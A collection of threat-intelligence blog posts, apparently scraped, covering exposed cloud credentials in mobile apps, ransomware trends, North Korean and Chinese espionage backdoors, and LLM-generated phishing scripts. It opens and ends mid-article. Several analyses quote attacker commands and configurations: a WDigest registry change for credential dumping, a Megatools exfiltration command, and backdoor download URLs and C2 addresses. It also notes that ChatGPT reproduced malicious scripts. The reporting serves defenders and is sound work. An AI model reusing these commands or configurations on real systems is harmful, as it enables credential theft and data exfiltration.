AWS credentials in the -[VSAppDelegate setupS3] method. (Figure. 7) These credentials are not encrypted, meaning anyone with access to the app's binary could easily extract them, gaining unauthorized access to the associated S3 buckets and potentially leading to data theft or manipulation. In all of these example apps, hardcoded credentials are used to authenticate with various AWS services, such as S3 buckets for storage and IoT data management. This common practice of embedding sensitive information like AWS keys directly within the code, without any form of encryption or protection, poses a severe risk. Attackers who gain access to these credentials could exploit them to compromise the app's backend infrastructure, steal user data, or cause service disruptions. A similar security issue has been identified in several popular Android apps (Figure. 8) that have hardcoded and unencrypted Microsoft Azure Blob Storage credentials within their source code. These credentials, embedded directly into the apps' binaries, pose significant risks to both the security and privacy of the apps' users. With over 5 million downloads on the Google Play Store, Meru Cabs hardcoded Azure credentials within the UploadLogs service (Figure. 9), embedding a connection string that includes an account key. This connection string is used to manage log uploads, exposing critical cloud storage resources to potential abuse. This app, with over 500K downloads, embeds multiple hardcoded Azure credentials across its codebase. (Figure. 10) These credentials are used for various purposes, such as adding posts, handling invoices, and storing user profiles. The use of plain-text connection strings to access Azure Blob Storage containers puts sensitive data at significant risk. With over 500K downloads, ReSound Tinnitus Relief also hardcodes its Azure Blob Storage credentials. (Figure. 11) These credentials are used to manage various assets and sound files, and their exposure could lead to unauthorized access and data breaches. These hardcoded credentials not only expose the Azure Blob Storage accounts to unauthorized access but also put user data and backend resources at risk. Anyone with access to the app's binary or source code could potentially extract these credentials and misuse them to manipulate or exfiltrate data, leading to severe security breaches. This repeated pattern of insecure credential management across multiple apps highlights the critical need for developers to adopt more secure practices. The examples highlighted in this blog demonstrate the serious security risks posed by hardcoded and unencrypted cloud service credentials in mobile apps. This practice exposes critical infrastructure to potential attacks, endangering user data and backend services. The widespread nature of these vulnerabilities across both iOS and Android platforms underscores the urgent need for a shift towards more secure development practices. Best Practices for Developers To mitigate these risks, developers should follow best practices for managing sensitive information within their applications: By adopting these best practices, developers can significantly reduce the risk of exposing sensitive information and ensure that their applications are secure against potential threats. As the examples in this blog demonstrate, the stakes are high, and it is imperative that security be a top priority in the mobile app development lifecycle.

    "text": "Ransomware attacks continued to occur at near peak levels during the third quarter of this year, which also saw the newly formed RansomHub group overtake the veteran LockBit operation as the number one ransomware threat. Analysis of data from ransomware leak sites found that ransomware actors claimed 1,255 attacks in the third quarter of 2024, down very slightly from 1,325 in the second quarter, but the overall number of attacks is continuing to trend upwards. The biggest development during the quarter was the decline of LockBit, which was previously the dominant player in the ransomware ecosystem, claiming more than three times more attacks than its nearest rival Qilin in the second quarter. The number of LockBit attacks claimed in the third quarter was 188, down from the 353 attacks claimed in the second quarter. LockBit was the target of aninternational law enforcement operationin February 2024, which impacted its level of activity in the first quarter of this year. By the second quarter, it appeared to recover completely, but it is possible that the operation has led to a loss of trust among LockBit affiliates, particularly since authorities indicated they had collected information that could identify affiliates. The biggest beneficiary of LockBit’s decline was RansomHub,which only became active in February 2024but is now the number one ransomware operation in terms of the number of attacks claimed. RansomHub claimed 191 attacks in the third quarter, up from 75 in the second quarter. The group’s rapid rise may be explained by its success in recruiting experienced affiliates for its ransomware-as-a-service operation, reportedly offering more attractive terms than rival outfits. Another group that stepped up attacks was Qilin (aka Agenda), which claimed 140 attacks in the third quarter, up from 97 in the second quarter. There was once again a significant difference between the overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit still figured highly in the number of claimed attacks, it only accounted for 7% of the attacks investigated by Symantec in the third quarter. While RansomHub accounted for 15% of publicly claimed attacks, it was responsible for a third of the attacks investigated by Symantec, supporting reports that it is signing up experienced affiliate attackers from rival groups. Today’s ransomware attacks are complex multi-stage intrusions that involve the deployment of multiple tools and often a significant amount of hands-on-keyboard activity on the part of the attackers. An analysis of the most frequently seen tools used in ransomware attacks gives some indication of the favored tactics, techniques, and procedures (TTPs) among ransomware actors at present. These tools fall mostly into four categories: Living off the Land:Utilities that are native to the Windows environment that can be leveraged by an attacker. Tools such as PsExec and WMI can be leveraged by attackers to move laterally on networks and execute commands on remote machines. PowerShell, meanwhile, is a powerful scripting tool that can be used to run commands, download payloads, move laterally, and carry out reconnaissance. Impairing Defenses:A growing number of attackers are using tools that leverage the Bring Your Own Vulnerable Driver (BYOD) technique. Attackers will deploy a signed vulnerable driver to the target network and use that driver to kill security software. Drivers are given kernel access, which means that they can be used to kill processes. In most cases, the vulnerable driver is deployed along with a malicious executable, which will use the driver to issue commands. Remote Desktop/Remote Admin:While these software packages are used legitimately for remote administration or tech support, attackers are turning to them because they effectively provide backdoor access to a machine. Tools such as RDP, AnyDesk, Splashtop, and ScreenConnect are frequently deployed by ransomware actors. Data Exfiltration:Most ransomware groups carry out double-extortion attacks, stealing data from a victim’s network prior to encryption and using the threat of leaking that stolen data as an additional form of leverage. Rclone is the most frequently used exfiltration tool. Many of the remote admin packages used by ransomware actors also have exfiltration capabilities. The growth of ransomware operations such as RansomHub and Qilin to rival LockBit isn’t welcome news, as it may make the ransomware ecosystem more robust and less likely to experience major disruption should a dominant operator be taken down or go offline.

    "text": "Symantec’s Threat Hunter Team has found evidence that the North Korean Stonefly group (aka Andariel, APT45, Silent Chollima, Onyx Sleet) is continuing to mount financially motivated attacks against organizations in the U. S., despite being the subject of an indictment and a multi-million dollar reward. Symantec, part ofBroadcom, found evidence of intrusions against three different organizations in the U. S. in August of this year, a month after the indictment was published. While the attackers didn’t succeed in deploying ransomware on the networks of any of the organizations affected, it is likely that the attacks were financially motivated. All the victims were private companies and involved in businesses with no obvious intelligence value. In several of the attacks, Stonefly’s custom malware Backdoor. Preft (aka Dtrack, Valefor) was deployed. This tool is exclusively associated with the group. In addition to this,several Stonefly indicators of compromise recently documented by Microsoftwere found on the compromised networks. The attackers used a fake Tableau certificate documented by Microsoft in addition to two other certificates (see Indicators of Compromise) that appear to be unique to this campaign. Preft:Multi-stage backdoor capable of downloading and uploading files, executing commands, and downloading additional plugins. Preft can support multiple plugin types, including executable files, VBS, BAT, and shellcode. It has multiple persistence modes, including Startup_LNK, Service, Registry, and Task Scheduler. Nukebot:Backdoor capable of executing commands, downloading and uploading files, and taking screenshots. Nukebot has not been associated with Stonefly before; however, its source code was leaked and this is likely how Stonefly obtained the tool. Batch files:The attackers used a malicious batch file to enable plaintext credentials, modifying the registry to add: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 Mimikatz (see below) was then executed to dump credentials. Mimikatz:Publicly availablecredential dumping tool. The attackers used a custom variant of the tool that writes harvested credentials to the file C:\\Windows\\Temp\\KB0722.log. A similar custom variant of Mimikatz found on VirusTotal was linked by Mandiant to Stonefly. Keyloggers: The attackers deployed two distinct keyloggers in their attacks: Sliver:Open-sourcecross-platform penetration testing framework. Chisel:Open-source proxy tool. It creates a TCP/UDP tunnel that is transported over HTTP and secured via SSH. PuTTY:Publicly availableSSH client. Plink: Acommand-line connection toolfor PuTTY Megatools:Acommand line clientfor the Mega.nz cloud storage service. Megatools was used to perform data exfiltration: CSIDL_WINDOWS\\temp\\mt.exe put -u [REMOVED] -p [REMOVED] CSIDL_WINDOWS\\temp\\sig.rar /Root Snap2HTML:Publicly available toolthat takes snapshots of folder structures on a hard drive and saves them as HTML files. FastReverseProxy (FRP):Open-sourced toolto expose local servers to the public internet. On July 25, 2024,the U. S. Justice Department indicted a North Korean man named Rim Jong Hyokon charges related to the attack campaign. Rim is alleged to be a member of the Stonefly group, which is linked to the North Korean military intelligence agency, the Reconnaissance General Bureau (RGB). He was charged with being involved in extorting U. S. hospitals and other healthcare providers between 2021 and 2023, laundering the ransom proceeds, and then using these proceeds to fund additional cyberattacks against targets in the defense, technology, and government sectors worldwide. Targets of these follow-on attacks included two U. S. Air Force bases, NASA-OIG, and organizations located in Taiwan, South Korea, and China. In addition to the indictment, the U. S. Department of Stateoffered a reward of up to $10 million for informationon his location or identification. Stonefly first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U. S. government, and financial websites. It reappeared again in 2011, when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor. Prioxer) against selected targets. In March 2013, the group was linked to the Jokra (Tojan. Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string ofDDoS attacks against South Korean government websites. In recent years, the group’s capabilities have grown markedly and, since at least 2019, Symantec has seen its focus shift mainly to espionage operations against select, high-value targets. It appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. While other North Korean groups are well known for mounting financial attacks driven by the need to raise foreign currency for the regime, Stonefly had until recent years appeared not to be involved in financially motivated attacks. While Stonefly’s move into financially motivated attacks is a relatively recent development, the spotlight shone on the group’s activities due to the indictment naming one of its members has not yet led to a cessation of activity. The group is likely continuing to attempt to mount extortion attacks against organizations in the U. S.

    "text": "Ransomware activity increased markedly in the second quarter of 2024 as attackers seemingly recovered their momentum following the disruption experienced in late 2023 and early 2024. Analysis of data from ransomware leak sites found that ransomware actors claimed 1,310 attacks in the second quarter of 2024, a 36% increase on the first quarter of this year. This was the second highest amount of attacks claimed in a quarter by ransomware operators, short of the record 1,488 attacks claimed in the third quarter of 2023. Powering this increase in attacks has been the complete recovery of LockBit from disruption experienced following aninternational law enforcement operationin February 2024. LockBit, which is operated by the Syrphid cybercrime group, has long been the most prolific ransomware operation but experienced a dip in activity in the first quarter of this year. However, LockBit attacks increased significantly in the second quarter of 2024 and, with 353 attacks claimed this quarter, are now higher than ever. Another factor driving the overall increase in attacks has been the emergence of a number of operators to occupy the space once controlled by the now-departed Noberus ransomware operation. Noberus, along with LockBit, was among the dominant players before it closed down in March 2024, citing the impact of a law enforcement operation along with reports of a falling out with many of its affiliates. Chief among these successors has been Qilin (aka Agenda), which first emerged in late 2022 and is reportedly run as a ransomware-as-service (RaaS) operation. Attacks claimed by Qilin increased by 47% to 97 in the second quarter of 2024. Play, which has reportedly opened an RaaS operation, saw its attacks increase by 27% to 89 in the second quarter. Perhaps the most significant uptick in claimed attacks involved RansomHub,which first appeared in only February 2024 but appears to have been quick in winning over affiliates to its RaaS operation. Attacks claimed by RansomHub more than tripled in the second quarter to 75, up from 23 in the first quarter of this year. RansomHub’s surge in activity has pushed it into the center of the ransomware ecosystem and it was the fourth most prolific ransomware family in the second quarter. Yet again, there were marked differences between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit in both cases counted for the largest proportion of attacks, it claimed 27% of all publicly reported attacks and was responsible for 19% of all attacks investigated by Symantec. Conversely, Play was behind 19% of all attacks investigated by Symantec, but only accounted for 7% of all publicly claimed attacks. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that attackers using Play are more likely to advance their attacks at least to the payload deployment stage. Although the vector may not be discovered for every ransomware attack, the available evidence suggests that attackers are continuing to favor the exploitation of known vulnerabilities in public-facing applications as a means of access. For example, in July 2024, Symantec found that threat actors linked to the Snakefly cybercrime group were actively scanning for CrushFTP servers vulnerable toCVE-2024-4040to run remote commands to download malware onto compromised machines. While CVE-2024-4040 was patched on April 19, 2024, Snakefly was continuing to search for and exploit unpatched systems. Snakefly is a specialist in these kinds of attacks and has along track record of exploiting recently patched and zero-day vulnerabilitiesin order to mount extortion campaigns. Snakefly is responsible for the Cl0p ransomware and it appeared to be highly likely that the final objective of this campaign was the deployment of Cl0p ransomware. Along with exploitation of known vulnerabilities there is anecdotal evidence of attackers targeting exposed RDP servers with weak credentials and poor network segmentation to facilitate lateral movement. In many cases, the absence of multi-factor authentication (MFA) across these services means that weak credentials are particularly vulnerable to exploitation. The sharp increase in attacks in the second quarter of this year suggests that momentum is once again with attackers. While high-profile ransomware operations such as Noberus shut down, the pool of skilled affiliates appears to be undisturbed and many appear to simply migrate to alternative franchises.

    "text": "A previously unseen backdoor (Backdoor. Msupedge) utilizing an infrequently seen technique was deployed in an attack against a university in Taiwan. The most notable feature of this backdoor is that it communicates with a command-and-control (C&C) server via DNS traffic. While the technique is known and has beenused by multiple threat actors, it is nevertheless something that is not often seen. Msupedge is a backdoor in the form of a dynamic link library (DLL). It has been found installed in the following file paths: While wuplog.dll is loaded by Apache (httpd.exe), the parent process for wmiclnt.dll is unknown. Msupedge uses DNS tunneling for communication with the C&C server. The code for the DNS tunneling tool is based onthe publicly available dnscat2tool. It receives commands by performing name resolution. The host names that are resolved are structured as follows: Error notifications include the success or failure of the following: The backdoor also appears to encode the result of the command execution as a fifth-level domain and send it. Msupedge not only receives commands via DNS traffic but also uses the resolved IP address of the C&C server (ctl.msedeapi[.]net) as a command. The third octet of the resolved IP address is a switch case. The behavior of the backdoor will change based on the value of the third octet of the resolved IP address minus seven. For example, if the third octet is 145, this translates to 138 (expressed in hexadecimal as 0x8a) Msupedge supports the following commands: The initial intrusion was likely through the exploit of a recently patched PHP vulnerability (CVE-2024-4577). The vulnerability is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system. Successful exploitation of the vulnerability can lead to remote code execution. Symantec has seen multiple threat actors scanning for vulnerable systems in recent weeks. To date, we have found no evidence allowing us to attribute this threat and the motive behind the attack remains unknown.

    "text": "The number of threat actors leveraging legitimate cloud services in their attacks has grown this year as attackers have begun to realize their potential to provide low-key and low-cost infrastructure. Traffic to and from well known, trusted services such as Microsoft OneDrive or Google Drive may be less likely to raise red flags than communications with attacker-controlled infrastructure. In the past few weeks alone, Symantec’s Threat Hunter Team has identified three further espionage operations using cloud services and found evidence of further tools in development. Marc Elias, an investigator with the Threat Hunter Team,will be presenting these findings today (August 7) at the Black Hat Conference in Las Vegas. A previously unseen backdoor which Symantec has named GoGra (Trojan. Gogra) was deployed against a media organization in South Asia in November, 2023. GoGra is written in Go and uses the Microsoft Graph API to interact with a command-and-control (C&C) server hosted on Microsoft mail services. Graph is a Microsoft API designed to facilitate access to resources hosted on Microsoft cloud services, such as Microsoft 365. Authentication is carried out using OAuth access tokens. GoGra is configured to read messages from an Outlook username \"FNU LNU\" whose subject line starts with the word \"Input\". It decrypts the message contents using the AES-256 algorithm in Cipher Block Chaining (CBC) mode, using the following key: b14ca5898a4e4133bbce2ea2315a1916. Gogra executes commands via the cmd.exe input stream and supports an additional command named \"cd\" which changes the active directory. After the execution of a command, it encrypts the output and sends it to the same user with the subject \"Output\". Analysis of the backdoor revealed that it is highly likely it was developed by Harvester, a nation-state-backed groupuncovered by Symantec in 2021that specializes in targeting organizations in South Asia. GoGra is functionally similar to a known Harvester tool called Graphon, which was written in . NET. Aside from the different programming languages used, Graphon used a different AES key (juBvYU7}33Xq}ghO), did not contain the extra “cd” command, and did not have a hardcoded Outlook username to communicate with. The username was instead received from the C&C server. A previously unseen exfiltration tool was deployed by the Firefly espionage group in an attack against a military organization in South East Asia. Analysis of the tool revealed that it was apublicly available Google Drive clientin a Python wrapper. The tool was configured to search for all .jpg files in the System32 directory and upload them to Google Drive using a hardcoded refresh token. Many of the exfiltrated files were not actual .jpg images but were instead encrypted RAR files, which were likely either created by hands-on-keyboard activity by the attackers or by another attacker-deployed tool that copied and prepared data for exfiltration. Exfiltrated data included documents, meeting notes, call transcripts, building plans, email folders, and accounting data. A previously unseen backdoor named Trojan. Grager was deployed against three organizations in Taiwan, Hong Kong, and Vietnam in April 2024. Analysis of the backdoor revealed that it used the Graph API to communicate with a C&C server hosted on Microsoft OneDrive. Grager was downloaded from a typosquatted URL mimicking the open-source file archiver 7-Zip (hxxp://7-zip.tw/a/7z2301-x64[.]msi). The aforementioned MSI file, which acts as a dropper, is a Trojanized 7-Zip installer that installs the real 7-Zip software into the folder “C:\\Program Files (x86)\\7-Zip” along with a malicious DLL named “epdevmgr.dll” (SHA2: ab6a684146cec59ec3a906d9e018b318fb6452586e8ec8b4e37160bcb4adc985), a copy of the Tonerjam malware, and the encrypted Grager backdoor into a file named “data.dat” (SHA2: 45a5dd715dc5f08f3b987a0415c2e500c549508aadf4183fdb94f749af8f1d67). The Tonerjam malwarewas described by Mandiantas a launcher that decrypts and executes a shellcode payload, which in this case was the new backdoor Grager. The backdoor decrypts a client_id and refresh token for OneDrive from a blob within the file’s body. The backdoor supports the following commands: There are tentative links between this tool and a group known as UNC5330. Symantec observed the Tonerjam malware described in this blog being dropped with the same file name (epdevmgr.dll) by a benign sample named (EpDevMgr.exe), which Mandiant also attributes to UNC5330. UNC5330 was described as a “suspected China-nexus espionage actor” that exploited Ivanti Connect Secure VPN vulnerabilities (CVE-2024-21893 and CVE-2024-21887) to compromise appliances in early 2024. Symantec also found evidence of another backdoor called MoonTag (Trojan. Moontag) that appears to be currently in development. Several variants of the backdoor have been uploaded to VirusTotal in recent weeks, although none appeared complete. The malware, which may be named “Moon_Tag” by its developer given references in its strings, is based oncode published in this Google Group. All the variants found contain functionality for communicating with the Graph API. MoonTag samples match a YARA rule named “MAL_APT_9002_SabrePanda” that detects samples from the 9002 RAT malware family used by the Sabre Panda threat actor. We did not find strong links to attribute MoonTag to Sabre Panda, but we can attribute the MoonTag backdoor with high confidence to a Chinese-speaking threat actor based on the Chinese language used in the Google Group post and the infrastructure used by the attackers. Another backdoor (Trojan. Ondritols), which appears to be called Onedrivetools by its authors, has been deployed against IT services companies in the U. S. and Europe. A multi-stage backdoor, the first stage is a downloader that authenticates to Microsoft Graph API and downloads the second stage payload from OneDrive and executes it. The main payload will downloada publicly available filefrom GitHub. It will then create a folder in OneDrive named deviceId_n_<ip address> for each infected machine and upload the following file to OneDrive to signal the attackers the status of a new infection: /v1.0/me/drive/root:/deviceId_n_<ip address>/status It will then continue in a loop, authenticating itself using Graph API, creating a file called heartbeat with the content “1” and fetching the new commands to execute from a file called cmd, both files located in the victim folder. The output of the executed command will be saved in the same cmd file. The backdoor also can download files to its victims and upload files from the infected machine to OneDrive. The attackers used a tunneling tool known as Whipweave (SHA256: 30093c2502fed7b2b74597d06b91f57772f2ae50ac420bcaa627038af33a6982), likely derived from the open-source Chinese VPN Free Connect (FCN) project, to connect to an Operational Relay Box (ORB) network known as Orbweaver which is designed to obfuscate the origin of attacks. In May 2024,Symantec uncovered BirdyClient, new malware that used the Graph API to communicate with a OneDrive C&C server. The malware was used in an attack against an organization in Ukraine. Although leveraging cloud services for command and control is not a new technique, more and more attackers have started to use it recently. Three years ago, Volexity published aboutBlueLight, malware developed by the North Korea-linked Vedalia espionage group (aka APT37). This was followed by Symantec’s discovery of the Graphon backdoor in October 2021. The Russian Swallowtail espionage group (aka APT28, Fancy Bear) was found to have adopted the tactic followingthe discovery of Graphite—malware that used the Graph API to communicate with a OneDrive account that was acting as a C&C server. In June 2023,Symantec discovered Backdoor. Graphican, which was being used by the Flea (aka APT15, Nickel) group in a campaign against foreign affairs ministries in the Americas. The number of actors now deploying threats that leverage cloud services suggests that espionage actors are clearly studying threats created by other groups and mimicking what they perceive to be successful techniques.

    "text": "Symantec has observed an increase in attacks that appear to leverage Large Language Models (LLMs) to generate malicious code used to download various payloads. LLMs are a form of generative AI designed to understand and generate human-like text. They have a wide range of applications, from assisting in writing to automating customer service. However, like many powerful technologies, LLMs can also be abused. Recent malware campaigns observed by Symantec involved phishing emails containing code used to download various payloads, including Rhadamanthys, NetSupport, CleanUpLoader (Broomstick, Oyster), ModiLoader (DBatLoader), LokiBot, and Dunihi (H-Worm). Analysis of the scripts used to deliver malware in these attacks suggests they were generated using LLMs. The following example details a campaign targeting a wide range of sectors. The attacks involve phishing emails with attached .zip archives containing malicious .lnk files, which, once executed, trigger LLM-generated PowerShell scripts that lead to the deployment of malware. The emails purport to relate to an urgent financing issue and contain a password-protected ZIP file, the password for which is also included in the email. The ZIP file contains an LNK file that, when executed, runs a PowerShell script (Figure 2) likely generated using an LLM. Functions and variables are nicely formatted with leading single-line comments that use highly accurate grammar to explain their usage. The script can easily be produced automatically using an LLM. We were able to produce similar results during our research using ChatGPT and a series of simple prompts (Figure 3). Final payloads deployed in this campaign included the Rhadamanthys information-stealing malware and the CleanUpLoader backdoor (aka Broomstick, Oyster). The following example details the use of LLM-generated code to facilitate the phishing stage and the payload delivery stage of an attack. The following describes the attack chain events. 1. Initial access:User receives a human-crafted phishing email with an attachment, mimicking an HR notification. 2. Execution of LLM-generated script:Opening the malicious attachment executes an HTML file with embedded JavaScript that is highly likely generated by an LLM. This script is designed to download and execute additional payloads, although the webpage displayed in this case is fairly simple and the HTML behind it is small and quick to load. Analysis of the HTML file, which facilitates a crucial link of the attack chain, reveals the characteristic features of an LLM-generated file (Figure 6). The file itself can easily be produced automatically using an LLM, with little human effort required. 3. Final payload download:By the time the user sees the page shown in Figure 5, the next stage payload – a loader for the Dunihi (H-Worm) malware – would have already been downloaded if the user has not configured their browser to ask for download permission first. Symantec also observed campaigns delivering the ModiLoader (DBatLoader) malware loader, the LokiBot information-stealing Trojan, and NetSupport remote access Trojan. The use of LLMs to generate HTML code used in these campaigns is also suspected. The potential for AI to revolutionize our world is undeniable; however, it is also revolutionizing cybercrime. AI tools such as LLMs lower the barrier to entry for many threat actors, while increasing the level of sophistication for others. As we have shown, AI-powered tools have given threat actors not only the ability to quickly craft convincing and targeted phishing emails, but also to generate malicious code that would normally require considerable expertise, time, and resources. It is worth highlighting that AI is only going to get better. While the benefits for society are sure to be great, malicious actors will also benefit, using it to launch more sophisticated and effective attacks faster and at a larger scale. Symantec is at the forefront of cybersecurity, offering robust protection against the never-ending wave of new threats, including those recently observed, highly likely generated by LLMs. Our security solutions are equipped with advanced detection capabilities that block AI-based LLM-generated threats, with our threat hunting experts continuously monitoring the threat landscape, harvesting emerging threats, conducting detailed analysis, updating our automation models, and ensuring our customers are always protected.

    "text": "The Daggerfly (aka Evasive Panda, Bronze Highland) espionage group has extensively updated its toolset, introducing several new versions of its malware, most likely in response to exposure of older variants. The new tooling was deployed in a number of recent attacks against organizations in Taiwan and a U. S. NGO based in China, which indicates the group also engages in internal espionage. In the attack on this organization, the attackers exploited a vulnerability in an Apache HTTP server to deliver their MgBot malware. Among the new additions to Daggerfly’s arsenal are a new malware family based on the group’s MgBot modular malware framework and a new version of the Macma macOS backdoor. While Macma is a previously documented threat, it had hitherto been of unknown authorship. However, Symantec’s Threat Hunter Team has now found evidence suggesting that it is developed by Daggerfly. Active for at least a decade, Daggerfly is primarily known for its development and use of the MgBot framework. In 2023,Symantec reported a Daggerfly intrusionagainst a telecoms operator in Africa involving previously unseen plugins for MgBot. Macma is a macOS backdoor that wasfirst documented by Google in 2021but appears to have been used since at least 2019. At the time of discovery, it was being distributed in watering hole attacks involving compromised websites in Hong Kong. The watering holes contained exploits for iOS and macOS devices. Users of macOS devices were targeted with a privilege escalation vulnerability (CVE-2021-30869) which allowed the attackers to install Macma on vulnerable systems. Macma is a modular backdoor. Functionality includes: Following its exposure, further details about the threat were published byObjective-SeeandSentinelOne. Recent variants of Macma found by Symantec exhibit evidence of ongoing development. One version (SHA256: 003764fd74bf13cff9bf1ddd870cbf593b23e2b584ba4465114023870ea6fbef) contained a different main module (SHA256: 1f5e4d2f71478518fe76b0efbb75609d3fb6cab06d1b021d6aa30db424f84a5e) to previously documented versions. The main difference lies in strings that appear to function as configuration data (see Figure 1). A second version of Macma (SHA256: dad13b0a9f5fde7bcdda3e5afa10e7d83af0ff39288b9f11a725850b1e6f6313) contained what appeared to be incremental updates to the existing functionality. Some of the identified updates included: Its main module (SHA256: fce66c26deff6a5b7320842bc5fa8fe12db991efe6e3edc9c63ffaa3cc5b8ced) exhibited evidence of more extensive modification. This included: In addition to this, it too had different strings containing configuration data (see Figure 1). Another module from this variant (SHA256: eff1c078895bbb76502f1bbad12be6aa23914a4d208859d848d5f087da8e35e0) contained modified code to adjust the size of a created screen capture, which apparently related to the aspect ratio when resizing the capture. Although Macma was widely believed to have been linked to advanced persistent threat (APT) activity, it has hitherto not been linked to a particular group. However, Symantec has found evidence to suggest that it is part of the Daggerfly toolkit. Two variants of the Macma backdoor connected to a command-and-control (C&C) server (103.243.212[.]98) that was also used by an MgBot dropper. In addition to this shared infrastructure, Macma and other known Daggerfly malware including Mgbot all contain code from a single, shared library or framework. Elements of this library have been used to build Windows, macOS, Linux, and Android threats. Functionality provided by this library includes: An example of this library code is seen when the magic string \"inp\" is sent over a SOCK_DGRAM socket: sendto(*(_DWORD *)(v2 + 56), \"inp\", 3, 0, (const struct sockaddr *)(v2 + 60), 16); While sendto() may be used to communicate with other hosts in general, here the communication is with a local machine (127.0.0), and could be even be threads in the same process. Another example involves the magic string \"tim\" being sent over a socket similar to the following: sendto(*(_DWORD *)(v1 + 56), \"tim\", 3, 0, (const struct sockaddr *)(v1 + 60), 16); Symantec has yet to find any matching code in public repositories. Shared code and shared infrastructure between Macma and other Daggerfly tools suggests that Macma is also part of the Daggerfly toolkit. A new addition to Daggerfly’s toolkit is a Windows backdoor (Trojan. Suzafk),which was first documented by ESET in March 2024as Nightdoor (aka NetMM) when it was observed being used alongside Mgbot. Suzafk was developed using the same shared library used in Mgbot, Macma, and a number of other Daggerfly tools. Suzafk is a multi-staged backdoor capable of using TCP or OneDrive for C&C. The malware contained the following configuration, indicating the functionality to connect to OneDrive is in development or present in other variants of the malware: ReadMe=ConnONEDRIVE;Version=256;Tag=15ad490f332f3d9a;DownloadUrl=http://103.96.131.150:19876/30_1410402971.exe;token={\"refresh_token\":\"REDACTED\",\"client_id\":\"4aa6708f-f3c8-4511-8118-5a7208be6a44\",\"client_secret\":\"REDACTED\"};DownloaderSavePath=C:\\Programdata\\Office\\;HttpServerFolder=C:\\Program Files\\Common Files\\Cloudata\\; Another configuration to use a TCP connection for C&C purposes is also present in the backdoor: ReadMe=ConnTCP;Version=256;Tag=15ad490f332f3d9a;DownloadUrl=http://103.96.131.150:19876/30_1292836936.exe;IP=103.96.131.150;Port=40020;DownloaderSavePath=C:\\\\Programdata\\\\Office\\\\;HttpServerFolder=C:\\\\Program Files\\\\Common Files\\\\Cloudata\\\\; The loader (SHA256: 5687b32cdd5c4d1b3e928ee0792f6ec43817883721f9b86ec8066c5ec2791595) drops two files: Engine.dll and MeitUD.exe. MeituUD.exe is a legitimate application named DAEMON Tools Lite Helper. Engine.dll is a loader DLL that sets persistence via scheduled tasks and loads the final payload in memory. The backdoor has embedded code from the al-khaser project, a public code repository aimed to detect virtual machines, sandboxes, and malware analysis environments. It also creates the folders C:\\ProgramData\\Office\\EFir and C:\\ProgramData\\Office\\Temps and stores additional network configuration data under the C:\\ProgramData\\Office\\sysmgr file XOR encrypted with the key 0x7A. The network configuration in plaintext has the following parameters and values: LOCAL_MAC_ADDR=[mac address] [ManageTermKeyStatus] [ManageTermServerInfoOffset] [ManageTermUseCreateCloudDirAlgorithm] Next, the malware creates a cmd.exe shell to send and receive commands from the C&C server (103.96.131[.]150) via open pipes. Additionally, the following commands can be executed: ipconfigsysteminfotasklistnetstat New findings provide a clearer picture of the capabilities and resources behind Daggerfly. The group can create versions of its tools targeting most major operating system platforms. In addition to the tools documented here, Symantec has seen evidence of the ability to Trojanize Android APKs, SMS interception tools, DNS request interception tools, and even malware families targeting Solaris OS. Daggerfly appears to be capable of responding to exposure by quickly updating its toolset to continue its espionage activities with minimal disruption.

    "text": "Ransomware activity fell slightly during the first quarter of 2024, most likely as a result of disruption to two major ransomware groups. However, overall activity levels remain on an upward trend and the number of attacks claimed in the first quarter of 2024 was ahead of attacks claimed in the corresponding quarter of 2023. Analysis of data from ransomware leak sites found that ransomware actors claimed 962 attacks in the first quarter of 2024. The figure was down from the 1,190 attacks claimed in the fourth quarter of 2023, but still above the 886 attacks claimed in the first quarter of 2023. The drop in overall activity levels is likely linked to disruption experienced by LockBit and Noberus, which were the two most prolific ransomware operations in 2023. Noberus (aka ALPHV, BlackCat)was the target of a U. S.-led law enforcement operationin December 2023. Although Noberus attempted to reestablish itself in the following weeks, it eventually closed in March 2024, citing the impact of the law enforcement operation, amid reports of a falling out with many of its affiliates. LockBit meanwhile was thetarget of a second international law enforcement operationin February 2024, but it has continued to operate. LockBit’s position as the number one ransomware threat remained unchallenged in the first quarter of 2024, accounting for over 20% of all claimed attacks. It was followed by Play, which was recently reported as having started a ransomware-as-a-service (7%), the prolific Phobos affiliate 8Base (6%), and the emergent Qilin ransomware (6%). Once again, there were some big disparities between overall, publicly claimed activity levels and ransomware activity investigated by Symantec. While LockBit in both cases counted for the largest proportion of attacks, Akira was the second most prevalent ransomware family in attacks investigated by Symantec in Q1 (14%), yet it only accounted for 5.5% of all claimed attacks. Similarly, Blacksuit was involved in 11% of attacks investigated by Symantec, but only claimed 1.6% of all publicly reported attacks. The comparison may give some indication of success rates experienced by actors linked to each operation. For Symantec to positively identify an attack as associated with a certain ransomware family, the attack has to advance to the stage where the attackers attempt to deploy a payload. This suggests that attackers using Akira and Blacksuit are more likely to advance their attacks at least to the payload deployment stage. Available evidence suggests that exploitation of known vulnerabilities in public-facing applications continues to be the main vector for ransomware attacks. Attackers are continuing to target recently patched vulnerabilities in a bid to find unpatched systems. For example, in recent weeks, Symantec uncovered an ongoing campaign where attackers targeted web servers by exploiting a recently disclosed PHP vulnerability. The vulnerability (CVE-2024-4577) is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system. The issue also affects all versions of the XAMPP development environment installed on Windows. Successful exploitation of the vulnerability can lead to remote code execution. Once the attackers gain access to a vulnerable server, they download several tools, including a malicious HTA file that contains a copy of the open-source privilege-escalation tool BadPotato; a custom web shell; and a loader previously observed being used to deploy TellYouThePass ransomware. One notable development in Q1 was the return of the Clop (aka Cl0p) ransomware. Clop is operated by the Snakefly cybercrime group and fell into disuse during 2023 as the group began to forego encryption and focus purely on data theft for extortion. The threat actors achieve this chiefly by exploiting zero-day vulnerabilities in software that allow them to hit multiple victims at once, stealing their data before the activity is discovered, and threatening to publish it if a ransom isn’t paid. The most high-profile attack Snakefly was involved 